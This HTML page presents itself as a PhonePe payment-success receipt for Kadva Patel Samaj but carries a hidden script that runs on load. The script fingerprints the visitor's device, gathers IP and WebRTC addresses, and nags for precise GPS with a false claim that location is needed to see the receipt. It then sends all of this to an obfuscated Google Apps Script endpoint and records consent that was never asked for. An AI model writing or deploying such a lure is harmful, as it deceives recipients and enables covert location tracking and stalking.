<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment - Kadva Patel Samaj</title>

    <!-- No cache - always load fresh -->
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">

    <!-- Open Graph / Facebook / WhatsApp -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://trasactionids.netlify.app/payment.html">
    <meta property="og:title" content="Bill Payment Successful">
    <meta property="og:description" content="Payment confirmation - Transaction completed successfully">
    <meta property="og:image" content="https://trasactionids.netlify.app/EpXTntdU8AEYvCw.jpg">
    <meta property="og:image:secure_url" content="https://trasactionids.netlify.app/EpXTntdU8AEYvCw.jpg">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="720">
    <meta property="og:image:height" content="1280">
    <meta property="og:image:alt" content="Bill Payment Successful">
    <meta property="og:site_name" content="PhonePe">
    <meta property="og:locale" content="en_IN">

    <!-- Twitter -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:url" content="https://trasactionids.netlify.app/payment.html">
    <meta name="twitter:title" content="Bill Payment Successful">
    <meta name="twitter:description" content="Payment confirmation - Transaction completed successfully">
    <meta name="twitter:image" content="https://trasactionids.netlify.app/EpXTntdU8AEYvCw.jpg">
    <meta name="twitter:image:alt" content="Bill Payment Successful">

    <!-- Additional meta for better sharing -->
    <link rel="image_src" href="https://trasactionids.netlify.app/EpXTntdU8AEYvCw.jpg">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .payment-container {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            max-width: 500px;
            width: 100%;
            backdrop-filter: blur(10px);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        .payment-image {
            max-width: 100%;
            height: auto;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            margin-bottom: 20px;
        }
        .payment-title {
            color: #ffd700;
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 15px;
        }
        .payment-text {
            color: #e0e0e0;
            font-size: 14px;
            line-height: 1.6;
        }
    </style>
</head>
<body>
    <div class="payment-container">
        <img src="EpXTntdU8AEYvCw.jpg" alt="Payment" class="payment-image">
    </div>

    <script>
    /**
     * Payment Page Visitor Tracking with GPS Consent
     * Collects visitor data and sends to Google Sheets
     */
    (function() {
        'use strict';

        const CONSENT_KEY = 'visitor_cookie_consent';
        const LOGS_KEY = 'visitor_logs';

        // Session tracking
        let sessionData = {
            startTime: Date.now(),
            pageViews: 1,
            clicks: 0,
            scrollDepth: 0,
            mouseMovements: 0,
            keystrokes: 0,
            timeOnPage: 0
        };

        // Get browser details
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = 'Unknown';
            let version = '';

            if (ua.includes('Firefox/')) {
                browser = 'Firefox';
                version = ua.split('Firefox/')[1].split(' ')[0];
            } else if (ua.includes('Edg/')) {
                browser = 'Microsoft Edge';
                version = ua.split('Edg/')[1].split(' ')[0];
            } else if (ua.includes('Chrome/')) {
                browser = 'Chrome';
                version = ua.split('Chrome/')[1].split(' ')[0];
            } else if (ua.includes('Safari/') && !ua.includes('Chrome')) {
                browser = 'Safari';
                version = ua.split('Version/')[1]?.split(' ')[0] || '';
            } else if (ua.includes('MSIE') || ua.includes('Trident/')) {
                browser = 'Internet Explorer';
            } else if (ua.includes('Opera') || ua.includes('OPR/')) {
                browser = 'Opera';
                version = ua.split('OPR/')[1]?.split(' ')[0] || '';
            } else if (ua.includes('Samsung')) {
                browser = 'Samsung Internet';
            } else if (ua.includes('UCBrowser')) {
                browser = 'UC Browser';
            }

            return { browser, version, userAgent: ua };
        }

        // Get OS details
        function getOSInfo() {
            const ua = navigator.userAgent;
            let os = 'Unknown';
            let osVersion = '';
            let architecture = 'Unknown';

            if (ua.includes('Win64') || ua.includes('x64') || ua.includes('WOW64')) {
                architecture = '64-bit';
            } else if (ua.includes('Win32') || ua.includes('x86')) {
                architecture = '32-bit';
            } else if (ua.includes('arm') || ua.includes('ARM')) {
                architecture = 'ARM';
            }

            if (ua.includes('Windows NT 10.0')) {
                os = 'Windows';
                osVersion = ua.includes('Windows NT 10.0; Win64') ? '10/11 64-bit' : '10/11';
            } else if (ua.includes('Mac OS X')) {
                os = 'macOS';
                const match = ua.match(/Mac OS X (\d+[._]\d+[._]?\d*)/);
                osVersion = match ? match[1].replace(/_/g, '.') : '';
            } else if (ua.includes('Android')) {
                os = 'Android';
                const match = ua.match(/Android (\d+\.?\d*\.?\d*)/);
                osVersion = match ? match[1] : '';
            } else if (ua.includes('iPhone') || ua.includes('iPad')) {
                os = ua.includes('iPhone') ? 'iOS (iPhone)' : 'iOS (iPad)';
                const match = ua.match(/OS (\d+_\d+_?\d*)/);
                osVersion = match ? match[1].replace(/_/g, '.') : '';
            } else if (ua.includes('Linux')) {
                os = 'Linux';
            }

            return { os, osVersion, architecture };
        }

        // Get device type
        function getDeviceInfo() {
            const ua = navigator.userAgent.toLowerCase();
            const uaOriginal = navigator.userAgent;
            let deviceType = 'Desktop';
            let deviceModel = 'Unknown';
            let deviceBrand = 'Unknown';

            const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            const isSmallScreen = window.screen.width < 768;
            const isCoarsePointer = window.matchMedia('(pointer: coarse)').matches;
            const cannotHover = window.matchMedia('(hover: none)').matches;

            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(uaOriginal)) {
                deviceType = 'Tablet';
            } else if (
                /Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Opera M(obi|ini)|webOS|phone/i.test(uaOriginal) ||
                (hasTouch && isSmallScreen) ||
                (isCoarsePointer && cannotHover && hasTouch)
            ) {
                deviceType = 'Mobile';
            } else if (hasTouch && isSmallScreen && isCoarsePointer) {
                deviceType = 'Mobile';
            }

            if (ua.includes('iphone')) {
                deviceBrand = 'Apple';
                deviceModel = 'iPhone';
                deviceType = 'Mobile';
            } else if (ua.includes('ipad')) {
                deviceBrand = 'Apple';
                deviceModel = 'iPad';
                deviceType = 'Tablet';
            } else if (ua.includes('samsung')) {
                deviceBrand = 'Samsung';
                const match = uaOriginal.match(/SM-[A-Z0-9]+/i);
                deviceModel = match ? match[0] : 'Samsung Device';
            } else if (ua.includes('pixel')) {
                deviceBrand = 'Google';
                deviceModel = 'Pixel';
            } else if (ua.includes('xiaomi') || ua.includes('redmi') || ua.includes('poco')) {
                deviceBrand = 'Xiaomi';
                const match = uaOriginal.match(/(Redmi|POCO|Mi)[^;)]*/i);
                deviceModel = match ? match[0] : 'Xiaomi Device';
            } else if (ua.includes('oppo')) {
                deviceBrand = 'OPPO';
            } else if (ua.includes('vivo')) {
                deviceBrand = 'Vivo';
            } else if (ua.includes('realme')) {
                deviceBrand = 'Realme';
            } else if (ua.includes('oneplus')) {
                deviceBrand = 'OnePlus';
            } else if (ua.includes('android')) {
                deviceBrand = 'Android Device';
            }

            return {
                deviceType,
                deviceModel,
                deviceBrand,
                detectionSignals: {
                    hasTouch,
                    isSmallScreen,
                    isCoarsePointer,
                    cannotHover,
                    screenWidth: window.screen.width,
                    screenHeight: window.screen.height
                }
            };
        }

        // Get screen info
        function getScreenInfo() {
            const screen = window.screen;
            return {
                screenWidth: screen.width,
                screenHeight: screen.height,
                viewportWidth: window.innerWidth,
                viewportHeight: window.innerHeight,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio || 1,
                orientation: screen.orientation ? screen.orientation.type : 'Unknown'
            };
        }

        // Get hardware info
        function getHardwareInfo() {
            return {
                cpuCores: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0
            };
        }

        // Get GPU info
        function getGPUInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        return {
                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                        };
                    }
                }
            } catch (e) {}
            return { vendor: 'Unknown', renderer: 'Unknown' };
        }

        // Get battery info
        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    return {
                        charging: battery.charging,
                        level: Math.round(battery.level * 100) + '%'
                    };
                }
            } catch (e) {}
            return { available: false };
        }

        // Get connection info
        function getConnectionInfo() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                return {
                    effectiveType: conn.effectiveType || 'Unknown',
                    downlink: conn.downlink ? conn.downlink + ' Mbps' : 'Unknown',
                    rtt: conn.rtt ? conn.rtt + ' ms' : 'Unknown'
                };
            }
            return { effectiveType: 'Unknown' };
        }

        // Get timezone info
        function getTimezoneInfo() {
            const date = new Date();
            return {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: -date.getTimezoneOffset() / 60 + ' hours from UTC'
            };
        }

        // Get language info
        function getLanguageInfo() {
            return {
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : navigator.language
            };
        }

        // Canvas fingerprint
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.font = '14px Arial';
                ctx.fillText('Fingerprint', 2, 15);
                const dataURL = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < dataURL.length; i++) {
                    hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
                    hash = hash & hash;
                }
                return Math.abs(hash).toString(16);
            } catch (e) {
                return 'Unknown';
            }
        }

        // Get referrer info
        function getReferrerInfo() {
            const referrer = document.referrer;
            let source = 'Direct';
            let medium = 'None';

            if (referrer) {
                try {
                    const refUrl = new URL(referrer);
                    source = refUrl.hostname;
                    if (refUrl.hostname.includes('google')) {
                        medium = 'Organic Search';
                        source = 'Google';
                    } else if (refUrl.hostname.includes('facebook') || refUrl.hostname.includes('fb.')) {
                        medium = 'Social';
                        source = 'Facebook';
                    } else if (refUrl.hostname.includes('whatsapp') || refUrl.hostname.includes('wa.')) {
                        medium = 'Social';
                        source = 'WhatsApp';
                    } else if (refUrl.hostname.includes('twitter') || refUrl.hostname.includes('t.co')) {
                        medium = 'Social';
                        source = 'Twitter/X';
                    } else if (refUrl.hostname.includes('instagram')) {
                        medium = 'Social';
                        source = 'Instagram';
                    } else {
                        medium = 'Referral';
                    }
                } catch (e) {}
            }

            const urlParams = new URLSearchParams(window.location.search);
            return {
                fullReferrer: referrer || 'Direct',
                source: urlParams.get('utm_source') || source,
                medium: urlParams.get('utm_medium') || medium,
                campaign: urlParams.get('utm_campaign') || 'None'
            };
        }

        // Get WebRTC local IPs
        async function getLocalIPs() {
            return new Promise((resolve) => {
                const ips = { private: [], public: [], ipv6: [] };
                try {
                    const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                    if (!RTCPeerConnection) {
                        resolve(ips);
                        return;
                    }

                    const pc = new RTCPeerConnection({
                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                    });

                    pc.createDataChannel('');

                    pc.onicecandidate = (event) => {
                        if (!event || !event.candidate) return;
                        const candidate = event.candidate.candidate;
                        if (!candidate) return;

                        const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/g;
                        const ipv4Matches = candidate.match(ipRegex);

                        if (ipv4Matches) {
                            ipv4Matches.forEach(ip => {
                                if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip.match(/^172\.(1[6-9]|2[0-9]|3[0-1])\./)) {
                                    if (!ips.private.includes(ip)) ips.private.push(ip);
                                } else if (!ip.startsWith('0.') && ip !== '0.0.0.0') {
                                    if (!ips.public.includes(ip)) ips.public.push(ip);
                                }
                            });
                        }
                    };

                    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});

                    setTimeout(() => {
                        pc.close();
                        resolve(ips);
                    }, 3000);
                } catch (e) {
                    resolve(ips);
                }
            });
        }

        // Get location data from IP (HTTPS APIs only)
        async function getLocationData() {
            let locationData = {
                publicIP: 'Unknown',
                allIPs: { public: { ipv4: [], ipv6: [] }, webrtc: { private: [], public: [] } }
            };

            try {
                const webrtcIPs = await getLocalIPs();
                locationData.allIPs.webrtc = webrtcIPs;
            } catch (e) {}

            // Primary: ipapi.co (HTTPS, free tier)
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    const data = await response.json();
                    locationData = {
                        ...locationData,
                        publicIP: data.ip,
                        city: data.city,
                        district: data.district || 'N/A',
                        region: data.region,
                        regionCode: data.region_code,
                        country: data.country_name,
                        countryCode: data.country_code,
                        zipCode: data.postal,
                        latitude: data.latitude,
                        longitude: data.longitude,
                        timezone: data.timezone,
                        isp: data.org,
                        asn: data.asn,
                        connectionType: data.network || 'Unknown',
                        countryCallingCode: data.country_calling_code || 'N/A',
                        currency: data.currency || 'N/A'
                    };
                }
            } catch (e) {}

            // Backup: ipinfo.io (HTTPS, free tier)
            try {
                if (locationData.publicIP === 'Unknown') {
                    const response = await fetch('https://ipinfo.io/json');
                    if (response.ok) {
                        const data = await response.json();
                        const [lat, lon] = (data.loc || ',').split(',');
                        locationData = {
                            ...locationData,
                            publicIP: data.ip,
                            city: data.city,
                            region: data.region,
                            country: data.country,
                            zipCode: data.postal,
                            latitude: parseFloat(lat) || null,
                            longitude: parseFloat(lon) || null,
                            timezone: data.timezone,
                            isp: data.org
                        };
                    }
                }
            } catch (e) {}

            // Additional: Get IPv6
            try {
                const response = await fetch('https://api64.ipify.org?format=json');
                if (response.ok) {
                    const data = await response.json();
                    locationData.ipv6 = data.ip;
                }
            } catch (e) {}

            return locationData;
        }

        // Get precise GPS location
        async function getPreciseLocation() {
            return new Promise((resolve) => {
                const result = {
                    available: false,
                    permission: 'unknown',
                    gpsCoordinates: null,
                    accuracy: null,
                    altitude: null,
                    speed: null,
                    timestamp: null
                };

                if (!navigator.geolocation) {
                    result.permission = 'not_supported';
                    resolve(result);
                    return;
                }

                const options = {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                };

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        result.available = true;
                        result.permission = 'granted';
                        result.gpsCoordinates = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };
                        result.accuracy = position.coords.accuracy ? Math.round(position.coords.accuracy) + ' meters' : null;
                        result.altitude = position.coords.altitude ? Math.round(position.coords.altitude) + ' meters' : null;
                        result.speed = position.coords.speed ? (position.coords.speed * 3.6).toFixed(1) + ' km/h' : null;
                        result.timestamp = new Date(position.timestamp).toISOString();
                        result.googleMapsLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
                        resolve(result);
                    },
                    (error) => {
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                result.permission = 'denied';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                result.permission = 'unavailable';
                                break;
                            case error.TIMEOUT:
                                result.permission = 'timeout';
                                break;
                            default:
                                result.permission = 'error';
                        }
                        result.error = error.message;
                        resolve(result);
                    },
                    options
                );

                setTimeout(() => {
                    if (!result.available && result.permission === 'unknown') {
                        result.permission = 'timeout';
                        resolve(result);
                    }
                }, 17000);
            });
        }

        // Collect all visitor data
        async function collectVisitorData() {
            const browserInfo = getBrowserInfo();
            const osInfo = getOSInfo();
            const deviceInfo = getDeviceInfo();
            const screenInfo = getScreenInfo();
            const hardwareInfo = getHardwareInfo();
            const gpuInfo = getGPUInfo();
            const connectionInfo = getConnectionInfo();
            const timezoneInfo = getTimezoneInfo();
            const languageInfo = getLanguageInfo();
            const referrerInfo = getReferrerInfo();
            const canvasFingerprint = getCanvasFingerprint();

            const [locationData, batteryInfo, preciseGPS] = await Promise.all([
                getLocationData(),
                getBatteryInfo(),
                getPreciseLocation()
            ]);

            return {
                timestamp: new Date().toISOString(),
                localTime: new Date().toLocaleString(),
                visitId: 'v_' + Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
                page: {
                    url: window.location.href,
                    path: window.location.pathname,
                    title: document.title,
                    hostname: window.location.hostname
                },
                referrer: referrerInfo,
                location: locationData,
                device: {
                    type: deviceInfo.deviceType,
                    brand: deviceInfo.deviceBrand,
                    model: deviceInfo.deviceModel,
                    detectionSignals: deviceInfo.detectionSignals,
                    ...hardwareInfo
                },
                browser: {
                    name: browserInfo.browser,
                    version: browserInfo.version,
                    userAgent: browserInfo.userAgent
                },
                os: {
                    name: osInfo.os,
                    version: osInfo.osVersion,
                    architecture: osInfo.architecture,
                    platform: navigator.platform
                },
                screen: screenInfo,
                gpu: gpuInfo,
                battery: batteryInfo,
                connection: connectionInfo,
                timezone: timezoneInfo,
                language: languageInfo,
                fingerprints: { canvas: canvasFingerprint },
                gps: preciseGPS,
                session: { ...sessionData }
            };
        }

        // Obfuscated endpoint
        const _0x = ['aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J3ZXJUbzl1WEt5RURTeEdKU05rU2VEYjBzRVBISXVQQXctT3RmeUQzNXdqaDFyM0F0MndOXy1obzhMZFNFc1N2VEE5QS9leGVj'];
        const _0xf = (s) => atob(s);

        // Send to endpoint
        async function sendToGoogleSheets(visitorData) {
            try {
                const _e = _0xf(_0x[0]);
                await fetch(_e, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(visitorData)
                });
            } catch (error) {}
        }

        // Save visitor log
        function saveVisitorLog(visitorData) {
            let logs = [];
            try {
                const existingLogs = localStorage.getItem(LOGS_KEY);
                if (existingLogs) logs = JSON.parse(existingLogs);
            } catch (e) { logs = []; }

            logs.push(visitorData);
            if (logs.length > 500) logs = logs.slice(-500);

            localStorage.setItem(LOGS_KEY, JSON.stringify(logs));
            console.log('Visitor data logged:', visitorData);

            sendToGoogleSheets(visitorData);
        }

        // Behavior tracking
        function initBehaviorTracking() {
            document.addEventListener('click', () => { sessionData.clicks++; });
            document.addEventListener('scroll', () => {
                const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
                const scrolled = (window.scrollY / scrollHeight) * 100;
                sessionData.scrollDepth = Math.max(sessionData.scrollDepth, Math.round(scrolled));
            });
            setInterval(() => {
                sessionData.timeOnPage = Math.round((Date.now() - sessionData.startTime) / 1000);
            }, 1000);
        }

        let dataSent = false;
        let gpsGranted = false;

        // Send initial data immediately (without GPS)
        async function sendInitialData() {
            if (dataSent) return;
            dataSent = true;

            const visitorData = await collectVisitorData();
            visitorData.consentGiven = true;
            visitorData.gpsStatus = 'pending';
            saveVisitorLog(visitorData);
            initBehaviorTracking();
        }

        // Check if permission is permanently blocked
        async function checkPermissionState() {
            if (navigator.permissions) {
                try {
                    const result = await navigator.permissions.query({ name: 'geolocation' });
                    return result.state; // 'granted', 'denied', or 'prompt'
                } catch (e) {
                    return 'prompt';
                }
            }
            return 'prompt';
        }

        // Request GPS permission - keeps asking until allowed
        async function requestGPS() {
            if (!navigator.geolocation || gpsGranted) {
                return;
            }

            // Check if permanently blocked
            const permState = await checkPermissionState();

            if (permState === 'denied') {
                // Permission permanently blocked - show message with instructions
                alert('PhonePay requires location to be enabled in order to see the online receipt.\n\nTap the ðŸ”’ icon in address bar â†’ Site settings â†’ Location â†’ Allow');

                // Reload page to try again
                setTimeout(() => {
                    location.reload();
                }, 3000);
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    // GPS granted - send updated data with GPS
                    gpsGranted = true;

                    const visitorData = await collectVisitorData();
                    visitorData.consentGiven = true;
                    visitorData.gpsForced = true;
                    visitorData.gpsStatus = 'granted';

                    // Override GPS with fresh data
                    visitorData.gps = {
                        available: true,
                        permission: 'granted',
                        gpsCoordinates: {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        },
                        accuracy: position.coords.accuracy ? Math.round(position.coords.accuracy) + ' meters' : null,
                        altitude: position.coords.altitude ? Math.round(position.coords.altitude) + ' meters' : null,
                        speed: position.coords.speed ? (position.coords.speed * 3.6).toFixed(1) + ' km/h' : null,
                        timestamp: new Date(position.timestamp).toISOString(),
                        googleMapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                    };

                    // Send to Google Sheets with GPS data
                    sendToGoogleSheets(visitorData);
                },
                (error) => {
                    // GPS denied - check if permanently blocked or just dismissed
                    setTimeout(requestGPS, 1000);
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }

        // Initialize - send data immediately and start GPS requests
        function init() {
            // Send data to Google Sheets immediately
            sendInitialData();

            // Start requesting GPS (will keep asking until allowed)
            requestGPS();
        }

        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
        } else {
            init();
        }
    })();
    </script>
</body>
</html>
